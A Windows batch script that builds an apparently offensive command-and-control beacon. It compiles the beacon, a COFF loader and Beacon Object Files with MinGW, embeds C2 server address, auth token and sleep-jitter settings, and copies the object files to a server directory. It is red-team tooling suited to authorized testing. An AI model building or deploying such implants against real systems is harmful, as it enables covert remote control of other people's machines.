@echo off
setlocal enabledelayedexpansion
echo ========================================
echo MinGW BOF Build Script
echo ========================================

:: 1. Setup Directories
set BOF_BUILD_DIR=build\bofs
set BUILD_DIR=build
set SERVER_BOF_DIR=..\server\bofs
if not exist "%BOF_BUILD_DIR%" mkdir "%BOF_BUILD_DIR%"
if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"

:: 1.1 Compile-time configuration overrides
set "C2_SERVER_IP=%~1"
set "C2_SERVER_PORT=%~2"
set "C2_USER_AGENT=%~3"
set "C2_AUTH_TOKEN=%~4"
set "C2_SLEEP_BASE_MS=%~5"
set "C2_SLEEP_JITTER_MS=%~6"

if "%C2_SERVER_IP%"=="" set "C2_SERVER_IP=127.0.0.1"
if "%C2_SERVER_PORT%"=="" set "C2_SERVER_PORT=8080"
if "%C2_USER_AGENT%"=="" set "C2_USER_AGENT=Mozilla/5.0"
if "%C2_AUTH_TOKEN%"=="" set "C2_AUTH_TOKEN="
if "%C2_SLEEP_BASE_MS%"=="" set "C2_SLEEP_BASE_MS=5000"
if "%C2_SLEEP_JITTER_MS%"=="" set "C2_SLEEP_JITTER_MS=3000"

:: 2. Build Main Beacon Components
echo [1/3] Compiling Beacon components...

set BEACON_FLAGS=-c -O2 -I include -DBOF -DC2_SERVER_IP=\"%C2_SERVER_IP%\" -DC2_SERVER_PORT=%C2_SERVER_PORT% -DC2_USER_AGENT=\"%C2_USER_AGENT%\" -DC2_AUTH_TOKEN=\"%C2_AUTH_TOKEN%\" -DC2_SLEEP_BASE_MS=%C2_SLEEP_BASE_MS% -DC2_SLEEP_JITTER_MS=%C2_SLEEP_JITTER_MS%

echo Compiling beacon.c...
x86_64-w64-mingw32-gcc %BEACON_FLAGS% src\beacon.c -o "%BUILD_DIR%\beacon.obj"
if !errorlevel! neq 0 (echo [!] Failed to compile beacon.c && pause && exit /b 1)

echo Compiling beacon_compatibility.c...
x86_64-w64-mingw32-gcc %BEACON_FLAGS% src\beacon_compatibility.c -o "%BUILD_DIR%\beacon_compatibility.obj"
if !errorlevel! neq 0 (echo [!] Failed to compile beacon_compatibility.c && pause && exit /b 1)

echo Compiling COFFLoader.c...
x86_64-w64-mingw32-gcc %BEACON_FLAGS% src\COFFLoader.c -o "%BUILD_DIR%\COFFLoader.obj"
if !errorlevel! neq 0 (echo [!] Failed to compile COFFLoader.c && pause && exit /b 1)

:: 3. Build BOFs with GCC
echo [2/3] Compiling BOFs with x86_64-w64-mingw32-gcc...

set GCC_FLAGS=-c -Os -fno-asynchronous-unwind-tables -fno-stack-protector -DBOF -I include

for %%f in (bofs\*.c) do (
    echo Compiling %%~nf...
    x86_64-w64-mingw32-gcc %GCC_FLAGS% %%f -o "%BOF_BUILD_DIR%\%%~nf.obj"
    if !errorlevel! neq 0 (echo [!] Failed to compile %%f && pause && exit /b 1)
)

:: 4. Link Beacon Executable (add bcrypt)
echo [3/3] Linking beacon.exe...
x86_64-w64-mingw32-gcc "%BUILD_DIR%\beacon.obj" "%BUILD_DIR%\beacon_compatibility.obj" "%BUILD_DIR%\COFFLoader.obj" -o "%BUILD_DIR%\beacon.exe" -lws2_32 -lbcrypt
if !errorlevel! neq 0 (echo [!] Failed to link beacon.exe && pause && exit /b 1)

:: 5. Deploy BOFs to server
echo Deploying BOFs to server...
copy /Y "%BOF_BUILD_DIR%\*.obj" "%SERVER_BOF_DIR%\" >nul

echo ========================================
echo Build complete!
echo Beacon: %BUILD_DIR%\beacon.exe
echo BOFs: %BOF_BUILD_DIR%\
echo ========================================
pause